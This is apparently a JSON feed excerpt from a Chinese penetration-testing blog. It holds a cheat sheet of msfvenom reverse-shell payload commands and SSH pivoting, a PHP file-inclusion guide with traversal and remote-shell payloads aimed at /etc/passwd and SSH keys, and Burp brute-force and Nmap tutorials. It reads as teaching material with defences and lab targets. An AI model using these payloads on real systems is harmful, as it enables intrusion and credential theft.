aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"ssh\" tabindex=\"-1\"> ssh</h2>\n<h3 id=\"ssh-穿透\" tabindex=\"-1\"> SSH 穿透</h3>\n<div><pre><code><span>ssh</span> -D <span>127.0</span>.0.1:1080 -p <span>22</span> user@IP\nAdd socks4 <span>127.0</span>.0.1 <span>1080</span> <span>in</span> /etc/proxychains.conf\nproxychains commands target\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"ssh-穿透从一个网络到另一个网络\" tabindex=\"-1\"> SSH 穿透从一个网络到另一个网络</h3>\n<div><pre><code><span>ssh</span> -D <span>127.0</span>.0.1:1080 -p <span>22</span> user1@IP1\nAdd socks4 <span>127.0</span>.0.1 <span>1080</span> <span>in</span> /etc/proxychains.conf\nproxychains <span>ssh</span> -D <span>127.0</span>.0.1:1081 -p <span>22</span> user1@IP2\nAdd socks4 <span>127.0</span>.0.1 <span>1081</span> <span>in</span> /etc/proxychains.conf\nproxychains commands target\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"msfvenom\" tabindex=\"-1\"> msfvenom</h2>\n<h3 id=\"msf-payloads\" tabindex=\"-1\"> MSF Payloads</h3>\n<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> X <span>></span> system.exe\nmsfvenom -p php/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> R <span>></span> exploit.php\nmsfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e -a x86 --platform win -f asp -o file.asp\nmsfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e x86/shikata_ga_nai -b <span>\"<span title=\"\\x00\">\\x00</span>\"</span> -a x86 --platform win -f c\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"msf-生成在-linux-下反弹的-meterpreter-shell\" tabindex=\"-1\"> MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3>\n<div><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>IP Address<span>></span> <span>LPORT</span><span>=</span><span>443</span> -e -f elf -a x86 --platform linux -o shell\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"msf-生成反弹-shell-c-shellcode\" tabindex=\"-1\"> MSF 生成反弹 Shell (C Shellcode)</h3>\n<div><pre><code>msfvenom -p windows/shell_reverse_tcp <span>LHOST</span><span>=</span><span>127.0</span>.0.1 <span>LPORT</span><span>=</span><span>443</span> -b <span>\"<span title=\"\\x00\">\\x00</span><span title=\"\\x0a\">\\x0a</span><span title=\"\\x0d\">\\x0d</span>\"</span> -a x86 --platform win -f c\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"msf-生成反弹-python-shell\" tabindex=\"-1\"> MSF 生成反弹 Python Shell</h3>\n<div><pre><code>msfvenom -p cmd/unix/reverse_python <span>LHOST</span><span>=</span><span>127.0</span>.0.1 <span>LPORT</span><span>=</span><span>443</span> -o shell.py\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"msf-生成反弹-asp-shell\" tabindex=\"-1\"> MSF 生成反弹 ASP Shell</h3>\n<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -f asp -a x86 --platform win -o shell.asp\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"msf-生成反弹-bash-shell\" tabindex=\"-1\"> MSF 生成反弹 Bash Shell</h3>\n<div><pre><code>msfvenom -p cmd/unix/reverse_bash <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -o shell.sh\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"msf-生成反弹-php-shell\" tabindex=\"-1\"> MSF 生成反弹 PHP Shell</h3>\n<div><pre><code>msfvenom -p php/meterpreter_reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Connect On<span>></span> -o shell.php\n<span>add</span> <span>&lt;</span>?php at the beginning\nperl -i~ -0777pe<span>'s/^/&lt;?php \\n/'</span> shell.php\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"msf-生成反弹-win-shell\" tabindex=\"-1\"> MSF 生成反弹 Win Shell</h3>\n<div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp <span>LHOST</span><span>=</span><span>&lt;</span>Your IP Address<span>></span> <span>LPORT</span><span>=</span><span>&lt;</span>Your Port to Co\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2017-05-20T13:23:12.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "PHP 文件包含漏洞总结",
      "url": "https://vxhly.github.io/views/pentest/php-file-inclusion.html",
      "id": "https://vxhly.github.io/views/pentest/php-file-inclusion.html",
      "summary": "前言\nPHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入。\n\n",
      "content_html": "<div><p>前言</p>\n<p>PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时, 由于传入的文件名没有经过合理的校验, 从而操作了预想之外的文件, 就可能导致意外的文件泄露甚至恶意的代码注入。</p>\n</div>\n\n<h2 id=\"常见文件包含函数\" tabindex=\"-1\"> 常见文件包含函数</h2>\n<ul>\n<li><strong>include()</strong>: 执行到 include 时才包含文件, 找不到被包含文件时只会产生警告, 脚本将继续执行</li>\n<li><strong>require()</strong>: 只要程序一运行就包含文件, 找不到被包含的文件时会产生致命错误, 并停止脚本</li>\n<li><strong>include_once()<strong>和</strong>require_once()</strong>: 若文件中代码已被包含则不会再次包含</li>\n</ul>\n<h2 id=\"利用条件\" tabindex=\"-1\"> 利用条件</h2>\n<p>程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量</p>\n<p>注: PHP 中只要文件内容符合 PHP 语法规范, 包含时不管扩展名是什么都会被 PHP 解析, 若文件内容不符合 PHP 语法规范则会暴漏其源码。</p>\n<h2 id=\"漏洞危害\" tabindex=\"-1\"> 漏洞危害</h2>\n<ul>\n<li>执行任意代码</li>\n<li>包含恶意文件控制网站</li>\n<li>甚至控制服务器</li>\n</ul>\n<h2 id=\"漏洞分类\" tabindex=\"-1\"> 漏洞分类</h2>\n<ul>\n<li>本地文件包含: 可以包含本地文件, 在条件允许时甚至能执行代码</li>\n</ul>\n<p>-- 上传图片马, 然后包含 -- 读敏感文件, 读 PHP 文件 -- 包含日志文件 GetShell -- 包含 /proc/self/envion 文件 GetShell -- 包含 data: 或 php://input 等伪协议 -- 若有 phpinfo 则可以包含临时文件</p>\n<ul>\n<li>远程文件包含: 可以直接执行任意代码</li>\n</ul>\n<p>-- 要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</p>\n<h2 id=\"普通本地文件包含\" tabindex=\"-1\"> 普通本地文件包含</h2>\n<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>\"inc/\"</span> <span>.</span> <span>$_GET</span><span>[</span><span>'file'</span><span>]</span><span>)</span><span>;</span><span>?></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"攻击方式\" tabindex=\"-1\"> 攻击方式</h3>\n<h4 id=\"包含同目录下的文件\" tabindex=\"-1\"> 包含同目录下的文件</h4>\n<div><p>攻击方式</p>\n<p>?file=.htaccess</p>\n</div>\n<h4 id=\"目录遍历\" tabindex=\"-1\"> 目录遍历</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../var/lib/locate.db<br> ?file=../../../../../../../../../var/lib/mlocate/mlocate.db<br> (linux 中这两个文件储存着所有文件的路径, 需要 root 权限)</p>\n</div>\n<h4 id=\"包含错误日志\" tabindex=\"-1\"> 包含错误日志</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../var/log/apache/error.log</p>\n</div>\n<h4 id=\"获取-web-目录或者其他配置文件\" tabindex=\"-1\"> 获取 web 目录或者其他配置文件</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p>\n</div>\n<h4 id=\"包含上传的附件\" tabindex=\"-1\"> 包含上传的附件</h4>\n<div><p>攻击方式</p>\n<p>?file=../attachment/media/xxx.file</p>\n</div>\n<h4 id=\"读取-session-文件\" tabindex=\"-1\"> 读取 session 文件</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7<br> (session 文件一般在 /tmp 目录下, 格式为 <code>sess\\_[your phpsessid value]</code> , 有时候也有可能在/var/lib/php5 之类的, 在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值, 也许你能够获得一个 shell)</p>\n</div>\n<h4 id=\"系统中重要文件-需要-root-权限\" tabindex=\"-1\"> 系统中重要文件(需要 root 权限)</h4>\n<ul>\n<li><code>/root/.ssh/authorized_keys</code></li>\n<li><code>/root/.ssh/id_rsa</code></li>\n<li><code>/root/.ssh/id_rsa.keystore</code></li>\n<li><code>/root/.ssh/id_rsa.pub</code></li>\n<li><code>/root/.ssh/known_hosts</code></li>\n<li><code>/etc/shadow</code></li>\n<li><code>/root/.bash_history</code></li>\n<li><code>/root/.mysql_history</code></li>\n<li><code>/proc/self/fd/fd[0-9]* (文件标识符)</code></li>\n<li><code>/proc/mounts</code></li>\n<li><code>/proc/config.gz</code></li>\n</ul>\n<h2 id=\"有限制的本地文件包含\" tabindex=\"-1\"> 有限制的本地文件包含</h2>\n<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>\"inc/\"</span> <span>.</span> <span>$_GET</span><span>[</span><span>'file'</span><span>]</span> <span>.</span> <span>\".htm\"</span><span>)</span><span>;</span><span>?></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"攻击方式-1\" tabindex=\"-1\"> 攻击方式</h3>\n<h4 id=\"_00-截断\" tabindex=\"-1\"> %00 截断</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../etc/passwd%00<br> (需要 magic_quotes_gpc=off, PHP 小于 5.3.4 有效)</p>\n</div>\n<h4 id=\"_00-截断目录遍历\" tabindex=\"-1\"> %00 截断目录遍历</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off, unix 文件系统, 比如 FreeBSD, OpenBSD, NetBSD, Solaris)</p>\n</div>\n<h4 id=\"路径长度截断\" tabindex=\"-1\"> 路径长度截断:</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../etc/passwd/././././././.[...]/./././././.<br> (php 版本小于 5.2.8(?)可以成功, linux 需要文件名长于 4096, windows 需要长于 256)</p>\n</div>\n<h4 id=\"点号截断\" tabindex=\"-1\"> 点号截断:</h4>\n<div><p>攻击方式</p>\n<p>?file=../../../../../../../../../boot.ini/.........[...]............<br> (php 版本小于 5.2.8(?)可以成功, 只适用 windows, 点号需要长于 256)</p>\n</div>\n<h2 id=\"普通远程文件包含\" tabindex=\"-1\"> 普通远程文件包含</h2>\n<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>$_GET</span><span>[</span><span>'file'</span><span>]</span><span>)</span><span>;</span><span>?></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"攻击方式-2\" tabindex=\"-1\"> 攻击方式</h3>\n<h4 id=\"远程代码执行\" tabindex=\"-1\"> 远程代码执行:</h4>\n<div><p>攻击方式</p>\n<p>?file=[http|https|ftp]://example.com/shell.txt<br> (需要 allow_url_fopen=On 并且 allow_url_include=On)</p>\n</div>\n<h4 id=\"利用-php-流-input\" tabindex=\"-1\"> 利用 php 流 input:</h4>\n<div><p>攻击方式</p>\n<p>?file=php://input<br> (需要 allow_url_include=On)</p>\n</div>\n<h4 id=\"利用-php-流-filter\" tabindex=\"-1\"> 利用 php 流 filter:</h4>\n<div><p>攻击方式</p>\n<p>?file=php://filter/convert.base64-encode/resource=index.php<br> (需要 allow_url_include=On)</p>\n</div>\n<h4 id=\"利用-data-uris\" tabindex=\"-1\"> 利用 data URIs:</h4>\n<div><p>攻击方式</p>\n<p>?file=data://text/plain; base64, SSBsb3ZlIFBIUAo=<br> (需要 allow_url_include=On)</p>\n</div>\n<h4 id=\"利用-xss-执行任意代码\" tabindex=\"-1\"> 利用 XSS 执行任意代码:</h4>\n<div><p>攻击方式</p>\n<p>?file=<a href=\"http://127.0.0.1/path/xss.php?xss=phpcode\" target=\"_blank\" rel=\"noopener noreferrer\">http://127.0.0.1/path/xss.php?xss=phpcode</a><br> (需要 allow_url_fopen=On, allow_url_include=On 并且防火墙或者白名单不允许访问外网时, 先在同站点找一个 XSS 漏洞, 包含这个页面, 就可以注入恶意代码了。条件非常极端和特殊- -)</p>\n</div>\n<h2 id=\"有限制的远程文件包含\" tabindex=\"-1\"> 有限制的远程文件包含</h2>\n<div><pre><code><span><span>&lt;?php</span> <span>include</span><span>(</span><span>$_GET</span><span>[</span><span>'file'</span><span>]</span> <span>.</span> <span>\".htm\"</span><span>)</span><span>;</span><span>?></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>攻击方式</p>\n<p>?file=<a href=\"http://example.com/shell\" target=\"_blank\" rel=\"noopener noreferrer\">http://example.com/shell</a><br> ?file=<a href=\"http://example.com/shell.txt?\" target=\"_blank\" rel=\"noopener noreferrer\">http://example.com/shell.txt?</a><br> ?file=<a href=\"http://example.com/shell.txt%23\" target=\"_blank\" rel=\"noopener noreferrer\">http://example.com/shell.txt%23</a><br> (需要 allow_url_fopen=On 并且 allow_url_include=On)<br> ?file=\\evilshare\\shell.php (只需要 allow_url_include=On)</p>\n</div>\n<h2 id=\"延伸\" tabindex=\"-1\"> 延伸</h2>\n<p>其实在前面也说了, 这些漏洞产生原因是 PHP 函数在引入文件时, 传入的文件名没有经过合理的校验, 从而操作了预想之外的文件。实际上我们操作文件的函数不只是 include()一个, 上面提到的一些截断的方法同样可以适用于以下函数:</p>\n<ul>\n<li><strong>fopen</strong></li>\n<li><strong>file_get_contents</strong></li>\n<li><strong>copy</strong></li>\n<li><strong>parse_ini_file</strong></li>\n<li><strong>readfile</strong></li>\n<li><strong>file_put_contents</strong></li>\n<li><strong>mkdir</strong></li>\n<li><strong>tempnam</strong></li>\n<li><strong>move_uploaded_file</strong></li>\n<li><strong>rename</strong></li>\n<li><strong>unlink</strong></li>\n<li><strong>rmdir</strong></li>\n<li><strong>require</strong></li>\n<li><strong>require_once</strong></li>\n<li><strong>include_once</strong></li>\n<li><strong>ZipArchive::open()</strong></li>\n</ul>\n<h2 id=\"漏洞防御\" tabindex=\"-1\"> 漏洞防御</h2>\n<ul>\n<li>PHP 中使用 open_basedir 配置, 将访问限制在指定区域</li>\n<li>过滤 <code>./\\</code></li>\n<li>禁止服务器远程文件包含</li>\n</ul>\n",
      "date_published": "2017-04-02T16:31:38.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "Shell 监听脚本-新增文件",
      "url": "https://vxhly.github.io/views/pentest/shell-listen-for-new-files.html",
      "id": "https://vxhly.github.io/views/pentest/shell-listen-for-new-files.html",
      "summary": "前言\nLiunx 下的监听 shell 脚本, 脚本功能实现, 当一小时内有新增的新文件, 立刻删除它, 此脚本允许被后台运行。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Liunx 下的监听 shell 脚本, 脚本功能实现, 当一小时内有新增的新文件, 立刻删除它, 此脚本允许被后台运行。</p>\n</div>\n\n<h2 id=\"功能解释\" tabindex=\"-1\"> 功能解释</h2>\n<ol>\n<li>若含有文件上传漏洞时, 该脚本能够自动删除上传的文件</li>\n<li>在 <code>PWD(攻防对抗)</code> 中非常有用</li>\n<li>后台运行, 只占用进程号, 不占用 shell 界面</li>\n</ol>\n<h2 id=\"脚本代码\" tabindex=\"-1\"> 脚本代码</h2>\n<div><pre><code><span>#!/bin/bash</span>\n<span>while</span> <span>true</span>\n<span>do</span>\n  <span>find</span> /var/www/dvwa/ -cmin -60 -type f <span>|</span> <span>xargs</span> <span>rm</span> -rf\n  <span>sleep</span> <span>1</span>\n<span>done</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"脚本解释\" tabindex=\"-1\"> 脚本解释</h3>\n<ul>\n<li><code>while true</code> =&gt; 持续监听</li>\n<li><code>-cmin -60</code> =&gt; 查找一小时内（包含一小时）新增文件</li>\n<li><code>-type f</code> =&gt; 制定文件类型为文件</li>\n<li><code>|</code> =&gt; 管道符, 将前一个命令执行结果传送至后一个命令执行</li>\n<li><code>xargs</code> =&gt; 命令传递参数的一个过滤器, 可以批量执行</li>\n<li><code>sleep 1</code> =&gt; 上一条命令执行之后, 暂停 1 秒</li>\n<li><code>/var/www/dvwa/</code> =&gt; 可为任何目录, 这边是一个测试目录</li>\n</ul>\n<h2 id=\"运行\" tabindex=\"-1\"> 运行</h2>\n<div><pre><code><span>chmod</span> +x <span>[</span>fileName<span>]</span>.sh\n./<span>[</span>fileName<span>]</span>.sh <span>&amp;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"进程号查询\" tabindex=\"-1\"> 进程号查询</h3>\n<p>脚本后台运行时, 会生成一个进程号<br></p>\n<p><img src=\"/assets/shell-new-files-1.png\" alt=\"Shell 监听脚本\"></p>\n<p>通过 ps 命令可以查询进程<br></p>\n<p><img src=\"/assets/shell-new-files-2.png\" alt=\"Shell 监听脚本\"></p>\n<h2 id=\"测试\" tabindex=\"-1\"> 测试</h2>\n<h3 id=\"本地测试\" tabindex=\"-1\"> 本地测试</h3>\n<p>在 <code>/var/www/dvwa/</code> 某个目录下新增文件<br></p>\n<p><img src=\"/assets/shell-new-files-3.png\" alt=\"Shell 监听脚本\"></p>\n<h3 id=\"在有上传文件漏洞中测试\" tabindex=\"-1\"> 在有上传文件漏洞中测试</h3>\n<p>在 dvwa 中的上传文件漏洞环境进行测试<br></p>\n<p><img src=\"/assets/shell-new-files-4.png\" alt=\"Shell 监听脚本\"></p>\n",
      "image": "https://vxhly.github.io/assets/shell-new-files-1.png",
      "date_published": "2017-08-22T21:03:18.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "渗透工具用法（二）BurpSuite 的用法",
      "url": "https://vxhly.github.io/views/pentest/usage-of-burp.html",
      "id": "https://vxhly.github.io/views/pentest/usage-of-burp.html",
      "summary": "前言\n此系列笔记是网络渗透工具的使用方法, 本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务, 请求的拦截和修改, 扫描 web 应用程序漏洞, 以暴力破解登陆表单, 执行会话令牌等多种的随机性检查。\n\n",
      "content_html": "<div><p>前言</p>\n<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务, 请求的拦截和修改, 扫描 web 应用程序漏洞, 以暴力破解登陆表单, 执行会话令牌等多种的随机性检查。</p>\n</div>\n\n<h2 id=\"burp-suite-环境\" tabindex=\"-1\"> Burp Suite 环境</h2>\n<p><code>kali Liunx</code> 里已经集成了 Burp Suite 工具, <code>windows</code> 下安装 Burp Suite 之前请确定你的电脑里有 Java 环境<br> <a href=\"http://portswigger.net/burp/download.html\" target=\"_blank\" rel=\"noopener noreferrer\">Burp Suite 官网下载地址</a></p>\n<h3 id=\"jdk-安装和环境变量配置\" tabindex=\"-1\"> JDK 安装和环境变量配置</h3>\n<p><code>windows</code> 下安装 Burp Suite 需要 Java 环境进行支持, 由于本博客之前是有写过 JDK 的安装和环境变量的配置, 所以这里不再提供。</p>\n<h2 id=\"设置代理\" tabindex=\"-1\"> 设置代理</h2>\n<p>Burp Suite 带有一个代理, 通过默认端口 <code>8080</code> 上运行, 使用这个代理, 我们可以截获并修改从客户端到 web 应用程序的数据包。<br></p>\n<p><img src=\"/assets/burp-1.png\" alt=\"Burp Suite\"></p>\n<p>这里我们使用 <code>Chrome</code> 浏览器, 在 <code>Chrome</code> 浏览器里也需要设置代理方式<br></p>\n<p><img src=\"/assets/burp-2.png\" alt=\"Burp Suite\"></p>\n<h2 id=\"拦截改包和暴力破解\" tabindex=\"-1\"> 拦截改包和暴力破解</h2>\n<h3 id=\"模拟登录\" tabindex=\"-1\"> 模拟登录</h3>\n<p>这里使用漏洞集成平台 <code>DVWA</code> 来进行测试</p>\n<p><img src=\"/assets/burp-3.png\" alt=\"Burp Suite\"></p>\n<h3 id=\"拦截请求包\" tabindex=\"-1\"> 拦截请求包</h3>\n<p>随意输入密码（这里填写的密码为 <code>123</code> ）, 点击登录, 在 Burp Suite 里就可以看到拦截的请求包（前提是设置好代理）<br></p>\n<p><img src=\"/assets/burp-4.png\" alt=\"Burp Suite\"></p>\n<h3 id=\"修改请求包\" tabindex=\"-1\"> 修改请求包</h3>\n<p>将拦截到的数据包 <code>Send to Intruder</code> （也可以使用 <code>Ctrl+I</code> ）<br></p>\n<p><img src=\"/assets/burp-5.png\" alt=\"Burp Suite\"></p>\n<p>在 <code>Position</code> 选项中设置需要破解的变量。 <code>Burpsuite</code> 会自动设置许多变量, 单击 <code>Clear</code> 按钮, 把默认变量全部清除, 然后选中密码 <code>123</code> , 单击 <code>Add</code> 按钮将之设为需要破解的变量。由于只有一个变量, 因而 <code>Attack type</code> 攻击类型这里选择 <code>Sniper</code> 。<br></p>\n<p><img src=\"/assets/burp-6.png\" alt=\"Burp Suite\"></p>\n<h3 id=\"添加字典\" tabindex=\"-1\"> 添加字典</h3>\n<p>在 <code>Payloads</code> 选项中进行设置, 由于只有一个变量, 因而 <code>Payload set</code> 自动设置为 1, <code>Payload type</code> 这里设置为 <code>Simple list</code> 。在下面的 <code>Payload Options</code> 中, 我们添加可能的密码, 或者密码。<br></p>\n<p><img src=\"/assets/burp-7.png\" alt=\"Burp Suite\"></p>\n<h3 id=\"开始破解\" tabindex=\"-1\"> 开始破解</h3>\n<p>在菜单栏中选择 <code>Intruder/Start attack</code> , 就可以开始暴力破解。<br></p>\n<p><img src=\"/assets/burp-8.png\" alt=\"Burp Suite\"></p>\n<h3 id=\"分析\" tabindex=\"-1\"> 分析</h3>\n<p>在 <code>Results</code> 中, 双击 <code>length</code> 进行排序, 在这里所有登录成功或者登录失败的记录全部在这里。<br></p>\n<p><img src=\"/assets/burp-9.png\" alt=\"Burp Suite\"></p>\n<p>选中请求字节包最大的, 在 <code>Response/Render</code> 里就可以看到 <code>Welcome to the password protected area admin</code> 成功登录的信息<br></p>\n<p><img src=\"/assets/burp-10.png\" alt=\"Burp Suite\"></p>\n<h2 id=\"decode-和-encode\" tabindex=\"-1\"> Decode 和 Encode</h2>\n<p>Decoder 转化成规范的形式编码数据, 或转化成各种形式编码和散列的原始数据。它能够智能识别多种编码格式, 使用启发式技术。</p>\n<p>下面这张图是将一段 URL 进行 encode（编码）<br></p>\n<p><img src=\"/assets/burp-11.png\" alt=\"Burp Suite\"></p>\n",
      "image": "https://vxhly.github.io/assets/burp-1.png",
      "date_published": "2016-10-08T16:02:34.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "pentest"
      ]
    },
    {
      "title": "渗透工具用法（三）Nmap 的用法",
      "url": "https://vxhly.github.io/views/pentest/usage-of-nmap.html",
      "id": "https://vxhly.github.io/views/pentest/usage-of-nmap.html",
      "summary": "前言\n此系列笔记是网络渗透工具的使用方法, 本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到, 它不仅可以用来确定目标网络上计算机的存活状态, 而且可以扫描各个计算机的操作系统、开放端口、服务, 还有可能获得用户的证书。熟练掌握 Nmap 的用法, 可以极大的提高渗透测试技术。\n\n",
      "content_html": "<div><p>前言</p>\n<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到, 它不仅可以用来确定目标网络上计算机的存活状态, 而且可以扫描各个计算机的操作系统、开放端口、服务, 还有可能获得用户的证书。熟练掌握 Nmap 的用法, 可以极大的提高渗透测试技术。</p>\n</div>\n\n<h2 id=\"nmap-环境\" tabindex=\"-1\"> Nmap 环境</h2>\n<p><code>kali Liunx</code> 里已经集成了 Namp 环境, 所以就不在 <code>Windows</code> 下进行了。</p>\n<h2 id=\"nmap-命令结构\" tabindex=\"-1\"> Nmap 命令结构</h2>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -<span>[</span>option<span>]</span> <span>[</span>IP or domain<span>]</span> -oN <span>[</span>fileName.txt<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"nmap-使用解释\" tabindex=\"-1\"> Nmap 使用解释</h2>\n<h3 id=\"识别系统\" tabindex=\"-1\"> 识别系统</h3>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -O -Pn <span>[</span>IP or domain<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>-O</code> 选项, 可以获取到被扫描的主机的系统。 <code>-Pn</code> 选项禁用 Nmap 网络发现功能, 假定所有系统都是活动的</p>\n<h3 id=\"timing-模板\" tabindex=\"-1\"> Timing 模板</h3>\n<p><code>timing</code> 参数可以指定 nmap 扫描的速度。其中各个选项如下:</p>\n<ul>\n<li><strong>T0</strong> =&gt; paranoid 慢速网络扫描, 串行扫描, 两次扫描间隔 <code>5 分钟</code> 。扫描速度极慢。</li>\n<li><strong>T1</strong> =&gt; Sneky 慢速网络扫描, 串行扫描, 两次扫描间隔 <code>15 秒</code> , 扫描速度较慢。</li>\n<li><strong>T2</strong> =&gt; Polite 中速网络扫描, 串行扫描, 两次扫描间隔 <code>400 毫秒</code> , 扫描速度慢。</li>\n<li><strong>T3</strong> =&gt; Normal 中速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度正常。</li>\n<li><strong>T4</strong> =&gt; Aggressive 快速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度较快。</li>\n<li><strong>T5</strong> =&gt; Normal 快速网络扫描, 并行扫描, 两次扫描间隔 <code>0 秒</code> , 扫描速度极快。</li>\n</ul>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -T<span>[</span><span>0</span>-5<span>]</span> <span>[</span>IP or domain<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"扫描方式\" tabindex=\"-1\"> 扫描方式</h3>\n<h3 id=\"tcp-扫描\" tabindex=\"-1\"> TCP 扫描</h3>\n<p>端口扫描中最稳定的, 利用的是 TCP 三次握手。TCP 扫描通常用于收集有关目标的更多信息, 但是会和目标主机建立一个完成的 TCP 连接。</p>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -sT -Pn <span>[</span>IP or domain<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p><code>-sT</code> TCP 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>T</code> ==&gt; TCP 类型）</p>\n</div>\n<h4 id=\"syn-扫描\" tabindex=\"-1\"> SYN 扫描</h4>\n<p>TCP 两次握手（隐藏扫描, 速度快, nmap 缺省参数）</p>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -sS -Pn <span>[</span>IP or domain<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p><code>-sS</code> SYN 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>S</code> ==&gt; SYN 类型）</p>\n</div>\n<h4 id=\"ack-扫描\" tabindex=\"-1\"> ACK 扫描</h4>\n<p>ACK 扫描, 用于确定 TCP 端口是否被防火墙过滤。</p>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -sA -Pn <span>[</span>IP or domain<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p><code>-sA</code> ACK 连接扫描（ <code>s</code> ==&gt; 哪种类型扫描； <code>A</code> ==&gt; ACK 类型）</p>\n</div>\n<h4 id=\"udp-扫描\" tabindex=\"-1\"> UDP 扫描</h4>\n<p>DHCP, DNS, SNMP, TFTP 等都使用了 UDP 协议；UDP 扫描会评估目标系统上的 UDP 端口, 可以确认 UDP 端口是开放还是被防火墙过滤。</p>\n<p><code>Scanning Format:</code></p>\n<div><pre><code>nmap -sU -Pn <span>[</span>IP or domain<span>]</span>\n</code></pre><div 